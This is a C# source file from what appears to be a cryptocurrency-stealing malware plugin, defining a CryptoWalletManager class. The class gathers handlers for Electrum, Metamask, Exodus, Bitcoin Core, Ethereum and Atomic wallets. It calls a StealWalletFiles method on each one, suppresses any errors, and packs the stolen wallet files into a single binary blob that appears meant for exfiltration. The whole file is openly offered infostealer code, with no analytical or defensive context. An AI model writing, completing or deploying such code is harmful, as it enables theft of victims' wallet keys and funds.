using System;
using System.Collections.Generic;
using System.IO;

namespace Plugin.Crypto
{
    public class CryptoWalletManager
    {
        private List<CryptoWalletBase> wallets;
        
        public CryptoWalletManager()
        {
            wallets = new List<CryptoWalletBase>
            {
                new ElectrumWallet(),
                new MetamaskWallet(),
                new ExodusWallet(),
                new BitcoinCoreWallet(),
                new EthereumWallet(),
                new AtomicWallet()
            };
        }
        
        public Dictionary<string, byte[]> StealAllWallets()
        {
            Dictionary<string, byte[]> allWallets = new Dictionary<string, byte[]>();
            
            foreach (CryptoWalletBase wallet in wallets)
            {
                try
                {
                    Dictionary<string, byte[]> walletFiles = wallet.StealWalletFiles();
                    
                    foreach (KeyValuePair<string, byte[]> kvp in walletFiles)
                    {
                        allWallets[kvp.Key] = kvp.Value;
                    }
                }
                catch { }
            }
            
            return allWallets;
        }
        
        public static byte[] SerializeWalletData(Dictionary<string, byte[]> wallets)
        {
            using (MemoryStream ms = new MemoryStream())
            using (BinaryWriter writer = new BinaryWriter(ms))
            {
                writer.Write(wallets.Count);
                
                foreach (KeyValuePair<string, byte[]> kvp in wallets)
                {
                    writer.Write(kvp.Key);
                    writer.Write(kvp.Value.Length);
                    writer.Write(kvp.Value);
                }
                
                return ms.ToArray();
            }
        }
    }
}
